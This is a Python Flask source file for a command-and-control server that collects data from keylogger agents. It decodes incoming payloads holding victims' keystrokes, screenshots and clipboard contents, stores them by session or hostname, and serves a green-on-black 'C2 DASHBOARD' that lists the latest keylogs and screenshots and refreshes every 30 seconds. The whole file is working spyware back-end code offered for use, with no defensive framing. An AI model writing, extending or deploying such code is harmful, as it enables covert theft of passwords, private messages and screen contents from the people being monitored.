from flask import Flask, request, jsonify, send_from_directory, Response
import base64
import zlib
import json
import os
import datetime

app = Flask(__name__)

BASE_DIR = "c2_data"
for folder in ["logs", "keys", "screenshots"]:
    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)

def decrypt_payload(data_b64):
    """Decode agent payload"""
    try:
        data_bytes = base64.b64decode(data_b64)
        decompressed = zlib.decompress(data_bytes).decode('utf-8')
        return json.loads(decompressed)
    except Exception as e:
        print(f"❌ Decrypt failed: {e}")
        return None

@app.route("/receive", methods=["POST"])
def receive():
    try:
        if not request.is_json:
            return jsonify({"error": "JSON required"}), 400
            
        payload_encrypted = request.json.get("data")
        if not payload_encrypted:
            return jsonify({"error": "No data field"}), 400
        
        payload = decrypt_payload(payload_encrypted)
        if not payload:
            return jsonify({"error": "Payload decode failed"}), 400
        
        session_id = payload.get("session_id", payload.get("hostname", "unknown"))
        keys = payload.get("keys", "")
        shots = payload.get("screenshot_data", [])
        clipboard = payload.get("clipboard", "")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON log
        log_file = f"{BASE_DIR}/logs/{session_id}_{ts}.json"
        with open(log_file, "w") as f:
            json.dump(payload, f, indent=2)
        
        # Save keys
        if keys and keys != ".":
            keys_file = f"{BASE_DIR}/keys/{session_id}_{ts}.txt"
            with open(keys_file, "w", encoding="utf-8") as f:
                f.write(keys)
        
        # Save screenshots
        saved_shots = 0
        for shot in shots:
            try:
                shot_file = f"{BASE_DIR}/screenshots/{shot['filename']}"
                img_data = base64.b64decode(shot["data"])
                with open(shot_file, "wb") as f:
                    f.write(img_data)
                saved_shots += 1
            except Exception as e:
                print(f"❌ Shot save error: {e}")
        
        print(f"✅ [{session_id}] {len(keys)}ch keys, {saved_shots} shots")
        
        # EXACT client-expected format
        return jsonify({
            "keys_len": len(keys) if keys else 0,
            "shots": saved_shots,
            "status": "ok"
        }), 200
        
    except Exception as e:
        print(f"❌ SERVER ERROR: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
def dashboard():
    try:
        shots = sorted([f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.png')], reverse=True)[:12]
        keylogs = sorted([f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')], reverse=True)[:10]
        
        shots_html = ''.join([
            f'<div class="shot"><a href="/shots/{shot}" target="_blank">'
            f'<img src="/shots/{shot}" alt="{shot}" loading="lazy"></a>'
            f'<div>{shot}</div></div>'
            for shot in shots
        ])
        
        keys_html = ''.join([
            f'<div class="keylog"><a href="/keys/{key}" target="_blank">{key}</a></div>'
            for key in keylogs
        ])
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 C2 DASHBOARD</title>
    <meta name="viewport" content="width=device-width">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:20px;line-height:1.4}}
        .header{{text-align:center;margin-bottom:30px}}
        h1{{color:#0f0;font-size:3em;text-shadow:0 0 20px #0f0}}
        .stats{{display:flex;justify-content:center;gap:40px;margin-bottom:30px;font-size:1.2em}}
        .shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px;margin-bottom:30px}}
        .shot{{background:#111;padding:15px;border-radius:10px;border:2px solid #333;transition:transform 0.3s}}
        .shot:hover{{transform:scale(1.05);border-color:#0f0;box-shadow:0 0 20px #0f0}}
        .shot img{{width:100%;height:180px;object-fit:cover;border-radius:5px}}
        .shot div{{margin-top:10px;font-size:0.9em;overflow:hidden;text-overflow:ellipsis}}
        .keylogs{{background:#111;padding:25px;border-radius:10px;border-left:5px solid #0f0;max-height:400px;overflow-y:auto}}
        .keylog{{padding:12px;margin:8px 0;background:#000;border-radius:5px;cursor:pointer;transition:background 0.2s}}
        .keylog:hover{{background:#0a0a0a}}
        .keylog a{{color:#0f0;text-decoration:none}}
        .live{{animation:pulse 2s infinite}}
        @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 C2 DASHBOARD</h1>
        <div class="stats">
            <div>📸 <span id="shotcount">{len(shots)}</span> Shots</div>
            <div>⌨️ <span id="keycount">{len(keylogs)}</span> Logs</div>
            <div class="live">🟢 LIVE</div>
        </div>
    </div>
    
    <div class="shots-grid">
        {shots_html}
    </div>
    
    <div class="keylogs">
        <h2 style="margin-bottom:20px;font-size:1.5em">⌨️ Latest Keylogs</h2>
        {keys_html}
    </div>
    
    <script>
        setTimeout(()=>location.reload(), 30000);
    </script>
</body>
</html>
        """
        return html
        
    except Exception as e:
        return f"<pre style='color:#f00'>Dashboard Error: {e}</pre>", 500

@app.route("/shots/<path:filename>")
def serve_shot(filename):
    try:
        return send_from_directory(f"{BASE_DIR}/screenshots", filename)
    except:
        return "File not found", 404

@app.route("/keys/<path:filename>")
def serve_key(filename):
    try:
        filepath = f"{BASE_DIR}/keys/{filename}"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            content = content.replace('\n', '<br>').replace(' ', '&nbsp;')
            
            return f"""
<!DOCTYPE html>
<html><head><title>Keylog: {filename}</title>
<style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:40px;font-size:16px;line-height:1.6}}
pre{{background:#111;padding:30px;border-radius:15px;border:2px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style>
</head>
<body>
<h1 style="color:#0f0;margin-bottom:30px">{filename}</h1>
<pre>{content}</pre>
<a href="/" style="position:fixed;top:20px;left:20px;color:#0f0;font-size:20px;text-decoration:none">🏠 Dashboard</a>
</body></html>
            """
        return "File not found", 404
    except:
        return "Error", 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 C2 Server LIVE on :{port}")
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)